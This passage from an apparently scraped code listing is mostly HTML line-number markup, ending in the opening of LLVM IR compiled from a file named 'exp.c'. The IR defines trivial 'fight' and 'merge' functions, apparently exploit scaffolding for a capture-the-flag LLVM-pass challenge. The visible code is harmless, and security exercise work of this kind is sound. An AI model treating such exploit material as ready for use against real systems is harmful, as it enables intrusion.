class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br><span class="line">1397</span><br><span class="line">1398</span><br><span class="line">1399</span><br><span class="line">1400</span><br><span class="line">1401</span><br><span class="line">1402</span><br><span class="line">1403</span><br><span class="line">1404</span><br><span class="line">1405</span><br><span class="line">1406</span><br><span class="line">1407</span><br><span class="line">1408</span><br><span class="line">1409</span><br><span class="line">1410</span><br><span class="line">1411</span><br><span class="line">1412</span><br><span class="line">1413</span><br><span class="line">1414</span><br><span class="line">1415</span><br><span class="line">1416</span><br><span class="line">1417</span><br><span class="line">1418</span><br><span class="line">1419</span><br><span class="line">1420</span><br><span class="line">1421</span><br><span class="line">1422</span><br><span class="line">1423</span><br><span class="line">1424</span><br><span class="line">1425</span><br><span class="line">1426</span><br><span class="line">1427</span><br><span class="line">1428</span><br><span class="line">1429</span><br><span class="line">1430</span><br><span class="line">1431</span><br><span class="line">1432</span><br><span class="line">1433</span><br><span class="line">1434</span><br><span class="line">1435</span><br><span class="line">1436</span><br><span class="line">1437</span><br><span class="line">1438</span><br><span class="line">1439</span><br><span class="line">1440</span><br><span class="line">1441</span><br><span class="line">1442</span><br><span class="line">1443</span><br><span class="line">1444</span><br><span class="line">1445</span><br><span class="line">1446</span><br><span class="line">1447</span><br><span class="line">1448</span><br><span class="line">1449</span><br><span class="line">1450</span><br><span class="line">1451</span><br><span class="line">1452</span><br><span class="line">1453</span><br><span class="line">1454</span><br><span class="line">1455</span><br><span class="line">1456</span><br><span class="line">1457</span><br><span class="line">1458</span><br><span class="line">1459</span><br><span class="line">1460</span><br><span class="line">1461</span><br><span class="line">1462</span><br><span class="line">1463</span><br><span class="line">1464</span><br><span class="line">1465</span><br><span class="line">1466</span><br><span class="line">1467</span><br><span class="line">1468</span><br><span class="line">1469</span><br><span class="line">1470</span><br><span class="line">1471</span><br><span class="line">1472</span><br><span class="line">1473</span><br><span class="line">1474</span><br><span class="line">1475</span><br><span class="line">1476</span><br><span class="line">1477</span><br><span class="line">1478</span><br><span class="line">1479</span><br><span class="line">1480</span><br><span class="line">1481</span><br><span class="line">1482</span><br><span class="line">1483</span><br><span class="line">1484</span><br><span class="line">1485</span><br><span class="line">1486</span><br><span class="line">1487</span><br><span class="line">1488</span><br><span class="line">1489</span><br><span class="line">1490</span><br><span class="line">1491</span><br><span class="line">1492</span><br><span class="line">1493</span><br><span class="line">1494</span><br><span class="line">1495</span><br><span class="line">1496</span><br><span class="line">1497</span><br><span class="line">1498</span><br><span class="line">1499</span><br><span class="line">1500</span><br><span class="line">1501</span><br><span class="line">1502</span><br><span class="line">1503</span><br><span class="line">1504</span><br><span class="line">1505</span><br><span class="line">1506</span><br><span class="line">1507</span><br><span class="line">1508</span><br><span class="line">1509</span><br><span class="line">1510</span><br><span class="line">1511</span><br><span class="line">1512</span><br><span class="line">1513</span><br><span class="line">1514</span><br><span class="line">1515</span><br><span class="line">1516</span><br><span class="line">1517</span><br><span class="line">1518</span><br><span class="line">1519</span><br><span class="line">1520</span><br><span class="line">1521</span><br><span class="line">1522</span><br><span class="line">1523</span><br><span class="line">1524</span><br><span class="line">1525</span><br><span class="line">1526</span><br><span class="line">1527</span><br><span class="line">1528</span><br><span class="line">1529</span><br><span class="line">1530</span><br><span class="line">1531</span><br><span class="line">1532</span><br><span class="line">1533</span><br><span class="line">1534</span><br><span class="line">1535</span><br><span class="line">1536</span><br><span class="line">1537</span><br><span class="line">1538</span><br><span class="line">1539</span><br><span class="line">1540</span><br><span class="line">1541</span><br><span class="line">1542</span><br><span class="line">1543</span><br><span class="line">1544</span><br><span class="line">1545</span><br><span class="line">1546</span><br><span class="line">1547</span><br><span class="line">1548</span><br><span class="line">1549</span><br><span class="line">1550</span><br><span class="line">1551</span><br><span class="line">1552</span><br><span class="line">1553</span><br><span class="line">1554</span><br><span class="line">1555</span><br><span class="line">1556</span><br><span class="line">1557</span><br><span class="line">1558</span><br><span class="line">1559</span><br><span class="line">1560</span><br><span class="line">1561</span><br><span class="line">1562</span><br><span class="line">1563</span><br><span class="line">1564</span><br><span class="line">1565</span><br><span class="line">1566</span><br><span class="line">1567</span><br><span class="line">1568</span><br><span class="line">1569</span><br><span class="line">1570</span><br><span class="line">1571</span><br><span class="line">1572</span><br><span class="line">1573</span><br><span class="line">1574</span><br><span class="line">1575</span><br><span class="line">1576</span><br><span class="line">1577</span><br><span class="line">1578</span><br><span class="line">1579</span><br><span class="line">1580</span><br><span class="line">1581</span><br><span class="line">1582</span><br><span class="line">1583</span><br><span class="line">1584</span><br><span class="line">1585</span><br><span class="line">1586</span><br><span class="line">1587</span><br><span class="line">1588</span><br><span class="line">1589</span><br><span class="line">1590</span><br><span class="line">1591</span><br><span class="line">1592</span><br><span class="line">1593</span><br><span class="line">1594</span><br><span class="line">1595</span><br><span class="line">1596</span><br><span class="line">1597</span><br><span class="line">1598</span><br><span class="line">1599</span><br><span class="line">1600</span><br><span class="line">1601</span><br><span class="line">1602</span><br><span class="line">1603</span><br><span class="line">1604</span><br><span class="line">1605</span><br><span class="line">1606</span><br><span class="line">1607</span><br><span class="line">1608</span><br><span class="line">1609</span><br><span class="line">1610</span><br><span class="line">1611</span><br><span class="line">1612</span><br><span class="line">1613</span><br><span class="line">1614</span><br><span class="line">1615</span><br><span class="line">1616</span><br><span class="line">1617</span><br><span class="line">1618</span><br><span class="line">1619</span><br><span class="line">1620</span><br><span class="line">1621</span><br><span class="line">1622</span><br><span class="line">1623</span><br><span class="line">1624</span><br><span class="line">1625</span><br><span class="line">1626</span><br><span class="line">1627</span><br><span class="line">1628</span><br><span class="line">1629</span><br><span class="line">1630</span><br><span class="line">1631</span><br><span class="line">1632</span><br><span class="line">1633</span><br><span class="line">1634</span><br><span class="line">1635</span><br><span class="line">1636</span><br><span class="line">1637</span><br><span class="line">1638</span><br><span class="line">1639</span><br><span class="line">1640</span><br><span class="line">1641</span><br><span class="line">1642</span><br><span class="line">1643</span><br><span class="line">1644</span><br><span class="line">1645</span><br><span class="line">1646</span><br><span class="line">1647</span><br><span class="line">1648</span><br><span class="line">1649</span><br><span class="line">1650</span><br><span class="line">1651</span><br><span class="line">1652</span><br><span class="line">1653</span><br><span class="line">1654</span><br><span class="line">1655</span><br><span class="line">1656</span><br><span class="line">1657</span><br><span class="line">1658</span><br><span class="line">1659</span><br><span class="line">1660</span><br><span class="line">1661</span><br><span class="line">1662</span><br><span class="line">1663</span><br><span class="line">1664</span><br><span class="line">1665</span><br><span class="line">1666</span><br><span class="line">1667</span><br><span class="line">1668</span><br><span class="line">1669</span><br><span class="line">1670</span><br><span class="line">1671</span><br><span class="line">1672</span><br><span class="line">1673</span><br><span class="line">1674</span><br><span class="line">1675</span><br><span class="line">1676</span><br><span class="line">1677</span><br><span class="line">1678</span><br><span class="line">1679</span><br><span class="line">1680</span><br><span class="line">1681</span><br><span class="line">1682</span><br><span class="line">1683</span><br><span class="line">1684</span><br><span class="line">1685</span><br><span class="line">1686</span><br><span class="line">1687</span><br><span class="line">1688</span><br><span class="line">1689</span><br><span class="line">1690</span><br><span class="line">1691</span><br><span class="line">1692</span><br><span class="line">1693</span><br><span class="line">1694</span><br><span class="line">1695</span><br><span class="line">1696</span><br><span class="line">1697</span><br><span class="line">1698</span><br><span class="line">1699</span><br><span class="line">1700</span><br><span class="line">1701</span><br><span class="line">1702</span><br><span class="line">1703</span><br><span class="line">1704</span><br><span class="line">1705</span><br><span class="line">1706</span><br><span class="line">1707</span><br><span class="line">1708</span><br><span class="line">1709</span><br><span class="line">1710</span><br><span class="line">1711</span><br><span class="line">1712</span><br><span class="line">1713</span><br><span class="line">1714</span><br><span class="line">1715</span><br><span class="line">1716</span><br><span class="line">1717</span><br><span class="line">1718</span><br><span class="line">1719</span><br><span class="line">1720</span><br><span class="line">1721</span><br><span class="line">1722</span><br><span class="line">1723</span><br><span class="line">1724</span><br><span class="line">1725</span><br><span class="line">1726</span><br><span class="line">1727</span><br><span class="line">1728</span><br><span class="line">1729</span><br><span class="line">1730</span><br><span class="line">1731</span><br><span class="line">1732</span><br><span class="line">1733</span><br><span class="line">1734</span><br><span class="line">1735</span><br><span class="line">1736</span><br><span class="line">1737</span><br><span class="line">1738</span><br><span class="line">1739</span><br><span class="line">1740</span><br><span class="line">1741</span><br><span class="line">1742</span><br><span class="line">1743</span><br><span class="line">1744</span><br><span class="line">1745</span><br><span class="line">1746</span><br><span class="line">1747</span><br><span class="line">1748</span><br><span class="line">1749</span><br><span class="line">1750</span><br><span class="line">1751</span><br><span class="line">1752</span><br><span class="line">1753</span><br><span class="line">1754</span><br><span class="line">1755</span><br><span class="line">1756</span><br><span class="line">1757</span><br><span class="line">1758</span><br><span class="line">1759</span><br><span class="line">1760</span><br><span class="line">1761</span><br><span class="line">1762</span><br><span class="line">1763</span><br><span class="line">1764</span><br><span class="line">1765</span><br><span class="line">1766</span><br><span class="line">1767</span><br><span class="line">1768</span><br><span class="line">1769</span><br><span class="line">1770</span><br><span class="line">1771</span><br><span class="line">1772</span><br><span class="line">1773</span><br><span class="line">1774</span><br><span class="line">1775</span><br><span class="line">1776</span><br><span class="line">1777</span><br><span class="line">1778</span><br><span class="line">1779</span><br><span class="line">1780</span><br><span class="line">1781</span><br><span class="line">1782</span><br><span class="line">1783</span><br><span class="line">1784</span><br><span class="line">1785</span><br><span class="line">1786</span><br><span class="line">1787</span><br><span class="line">1788</span><br><span class="line">1789</span><br><span class="line">1790</span><br><span class="line">1791</span><br><span class="line">1792</span><br><span class="line">1793</span><br><span class="line">1794</span><br><span class="line">1795</span><br><span class="line">1796</span><br><span class="line">1797</span><br><span class="line">1798</span><br><span class="line">1799</span><br><span class="line">1800</span><br><span class="line">1801</span><br><span class="line">1802</span><br><span class="line">1803</span><br><span class="line">1804</span><br><span class="line">1805</span><br><span class="line">1806</span><br><span class="line">1807</span><br><span class="line">1808</span><br><span class="line">1809</span><br><span class="line">1810</span><br><span class="line">1811</span><br><span class="line">1812</span><br><span class="line">1813</span><br><span class="line">1814</span><br><span class="line">1815</span><br><span class="line">1816</span><br><span class="line">1817</span><br><span class="line">1818</span><br><span class="line">1819</span><br><span class="line">1820</span><br><span class="line">1821</span><br><span class="line">1822</span><br><span class="line">1823</span><br><span class="line">1824</span><br><span class="line">1825</span><br><span class="line">1826</span><br><span class="line">1827</span><br><span class="line">1828</span><br><span class="line">1829</span><br><span class="line">1830</span><br><span class="line">1831</span><br><span class="line">1832</span><br><span class="line">1833</span><br><span class="line">1834</span><br><span class="line">1835</span><br><span class="line">1836</span><br><span class="line">1837</span><br><span class="line">1838</span><br><span class="line">1839</span><br><span class="line">1840</span><br><span class="line">1841</span><br><span class="line">1842</span><br><span class="line">1843</span><br><span class="line">1844</span><br><span class="line">1845</span><br><span class="line">1846</span><br><span class="line">1847</span><br><span class="line">1848</span><br><span class="line">1849</span><br><span class="line">1850</span><br><span class="line">1851</span><br><span class="line">1852</span><br><span class="line">1853</span><br><span class="line">1854</span><br><span class="line">1855</span><br><span class="line">1856</span><br><span class="line">1857</span><br><span class="line">1858</span><br><span class="line">1859</span><br><span class="line">1860</span><br><span class="line">1861</span><br><span class="line">1862</span><br><span class="line">1863</span><br><span class="line">1864</span><br><span class="line">1865</span><br><span class="line">1866</span><br><span class="line">1867</span><br><span class="line">1868</span><br><span class="line">1869</span><br><span class="line">1870</span><br><span class="line">1871</span><br><span class="line">1872</span><br><span class="line">1873</span><br><span class="line">1874</span><br><span class="line">1875</span><br><span class="line">1876</span><br><span class="line">1877</span><br><span class="line">1878</span><br><span class="line">1879</span><br><span class="line">1880</span><br><span class="line">1881</span><br><span class="line">1882</span><br><span class="line">1883</span><br><span class="line">1884</span><br><span class="line">1885</span><br><span class="line">1886</span><br><span class="line">1887</span><br><span class="line">1888</span><br><span class="line">1889</span><br><span class="line">1890</span><br><span class="line">1891</span><br><span class="line">1892</span><br><span class="line">1893</span><br><span class="line">1894</span><br><span class="line">1895</span><br><span class="line">1896</span><br><span class="line">1897</span><br><span class="line">1898</span><br><span class="line">1899</span><br><span class="line">1900</span><br><span class="line">1901</span><br><span class="line">1902</span><br><span class="line">1903</span><br><span class="line">1904</span><br><span class="line">1905</span><br><span class="line">1906</span><br><span class="line">1907</span><br><span class="line">1908</span><br><span class="line">1909</span><br><span class="line">1910</span><br><span class="line">1911</span><br><span class="line">1912</span><br><span class="line">1913</span><br><span class="line">1914</span><br><span class="line">1915</span><br><span class="line">1916</span><br><span class="line">1917</span><br><span class="line">1918</span><br><span class="line">1919</span><br><span class="line">1920</span><br><span class="line">1921</span><br><span class="line">1922</span><br><span class="line">1923</span><br><span class="line">1924</span><br><span class="line">1925</span><br><span class="line">1926</span><br><span class="line">1927</span><br><span class="line">1928</span><br><span class="line">1929</span><br><span class="line">1930</span><br><span class="line">1931</span><br><span class="line">1932</span><br><span class="line">1933</span><br><span class="line">1934</span><br><span class="line">1935</span><br><span class="line">1936</span><br><span class="line">1937</span><br><span class="line">1938</span><br><span class="line">1939</span><br><span class="line">1940</span><br><span class="line">1941</span><br><span class="line">1942</span><br><span class="line">1943</span><br><span class="line">1944</span><br><span class="line">1945</span><br><span class="line">1946</span><br><span class="line">1947</span><br><span class="line">1948</span><br><span class="line">1949</span><br><span class="line">1950</span><br><span class="line">1951</span><br><span class="line">1952</span><br><span class="line">1953</span><br><span class="line">1954</span><br><span class="line">1955</span><br><span class="line">1956</span><br><span class="line">1957</span><br><span class="line">1958</span><br><span class="line">1959</span><br><span class="line">1960</span><br><span class="line">1961</span><br><span class="line">1962</span><br><span class="line">1963</span><br><span class="line">1964</span><br><span class="line">1965</span><br><span class="line">1966</span><br><span class="line">1967</span><br><span class="line">1968</span><br><span class="line">1969</span><br><span class="line">1970</span><br><span class="line">1971</span><br><span class="line">1972</span><br><span class="line">1973</span><br><span class="line">1974</span><br><span class="line">1975</span><br><span class="line">1976</span><br><span class="line">1977</span><br><span class="line">1978</span><br><span class="line">1979</span><br><span class="line">1980</span><br><span class="line">1981</span><br><span class="line">1982</span><br><span class="line">1983</span><br><span class="line">1984</span><br><span class="line">1985</span><br><span class="line">1986</span><br><span class="line">1987</span><br><span class="line">1988</span><br><span class="line">1989</span><br><span class="line">1990</span><br><span class="line">1991</span><br><span class="line">1992</span><br><span class="line">1993</span><br><span class="line">1994</span><br><span class="line">1995</span><br><span class="line">1996</span><br><span class="line">1997</span><br><span class="line">1998</span><br><span class="line">1999</span><br><span class="line">2000</span><br><span class="line">2001</span><br><span class="line">2002</span><br><span class="line">2003</span><br><span class="line">2004</span><br><span class="line">2005</span><br><span class="line">2006</span><br><span class="line">2007</span><br><span class="line">2008</span><br><span class="line">2009</span><br><span class="line">2010</span><br><span class="line">2011</span><br><span class="line">2012</span><br><span class="line">2013</span><br><span class="line">2014</span><br><span class="line">2015</span><br><span class="line">2016</span><br><span class="line">2017</span><br><span class="line">2018</span><br><span class="line">2019</span><br><span class="line">2020</span><br><span class="line">2021</span><br><span class="line">2022</span><br><span class="line">2023</span><br><span class="line">2024</span><br><span class="line">2025</span><br><span class="line">2026</span><br><span class="line">2027</span><br><span class="line">2028</span><br><span class="line">2029</span><br><span class="line">2030</span><br><span class="line">2031</span><br><span class="line">2032</span><br><span class="line">2033</span><br><span class="line">2034</span><br><span class="line">2035</span><br><span class="line">2036</span><br><span class="line">2037</span><br><span class="line">2038</span><br><span class="line">2039</span><br><span class="line">2040</span><br><span class="line">2041</span><br><span class="line">2042</span><br><span class="line">2043</span><br><span class="line">2044</span><br><span class="line">2045</span><br><span class="line">2046</span><br><span class="line">2047</span><br><span class="line">2048</span><br><span class="line">2049</span><br><span class="line">2050</span><br><span class="line">2051</span><br><span class="line">2052</span><br><span class="line">2053</span><br><span class="line">2054</span><br><span class="line">2055</span><br><span class="line">2056</span><br><span class="line">2057</span><br><span class="line">2058</span><br><span class="line">2059</span><br><span class="line">2060</span><br><span class="line">2061</span><br><span class="line">2062</span><br><span class="line">2063</span><br><span class="line">2064</span><br><span class="line">2065</span><br><span class="line">2066</span><br><span class="line">2067</span><br><span class="line">2068</span><br><span class="line">2069</span><br><span class="line">2070</span><br><span class="line">2071</span><br><span class="line">2072</span><br><span class="line">2073</span><br><span class="line">2074</span><br><span class="line">2075</span><br><span class="line">2076</span><br><span class="line">2077</span><br><span class="line">2078</span><br><span class="line">2079</span><br><span class="line">2080</span><br><span class="line">2081</span><br><span class="line">2082</span><br><span class="line">2083</span><br><span class="line">2084</span><br><span class="line">2085</span><br><span class="line">2086</span><br><span class="line">2087</span><br><span class="line">2088</span><br><span class="line">2089</span><br><span class="line">2090</span><br><span class="line">2091</span><br><span class="line">2092</span><br><span class="line">2093</span><br><span class="line">2094</span><br><span class="line">2095</span><br><span class="line">2096</span><br><span class="line">2097</span><br><span class="line">2098</span><br><span class="line">2099</span><br><span class="line">2100</span><br><span class="line">2101</span><br><span class="line">2102</span><br><span class="line">2103</span><br><span class="line">2104</span><br><span class="line">2105</span><br><span class="line">2106</span><br><span class="line">2107</span><br><span class="line">2108</span><br><span class="line">2109</span><br><span class="line">2110</span><br><span class="line">2111</span><br><span class="line">2112</span><br><span class="line">2113</span><br><span class="line">2114</span><br><span class="line">2115</span><br><span class="line">2116</span><br><span class="line">2117</span><br><span class="line">2118</span><br><span class="line">2119</span><br><span class="line">2120</span><br><span class="line">2121</span><br><span class="line">2122</span><br><span class="line">2123</span><br><span class="line">2124</span><br><span class="line">2125</span><br><span class="line">2126</span><br><span class="line">2127</span><br><span class="line">2128</span><br><span class="line">2129</span><br><span class="line">2130</span><br><span class="line">2131</span><br><span class="line">2132</span><br><span class="line">2133</span><br><span class="line">2134</span><br><span class="line">2135</span><br><span class="line">2136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; ModuleID = &#x27;exp.c&#x27;</span></span><br><span class="line">source_filename <span class="operator">=</span> <span class="string">&quot;exp.c&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">datalayout</span> <span class="operator">=</span> <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="keyword">target</span> <span class="keyword">triple</span> <span class="operator">=</span> <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@fight</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@merge</span>(<span class="type">i32</span><span class="punctuation">,</span> <span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%3</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="variable">%4</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%3</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span 